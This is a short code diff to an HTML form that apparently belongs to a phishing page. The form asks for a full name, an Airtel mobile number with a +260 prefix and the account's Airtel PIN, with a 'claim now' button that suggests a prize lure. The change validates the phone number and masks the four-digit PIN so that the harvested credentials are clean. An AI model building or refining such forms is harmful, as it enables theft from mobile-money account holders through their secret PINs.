@@ -13,9 +13,11 @@
     <label>Full Name</label>
     <input  type="text" id="name" placeholder="Full Name" required><br>
     <label>Airtel Number</label>
-    <input type="text" id="phone" placeholder="Airtel Number" required><br>
+    <input type="tel" id="phone" maxlength="10"
+    pattern="[0-9]{10}" placeholder="+260" required><br>
     <label>Airtel pin</label>
-    <input type="number" id="pin" placeholder="Airtel pin" required><br>
+    <input type="password" id="pin" maxlength="4"
+    pattern="[0-9]{4}"   placeholder="Airtel pin" required><br>
     <!-- <textarea id="message" placeholder="Message"></textarea> -->
 
     <button id="submit-btn" class="submit-btn" type="submit">claim now</button>
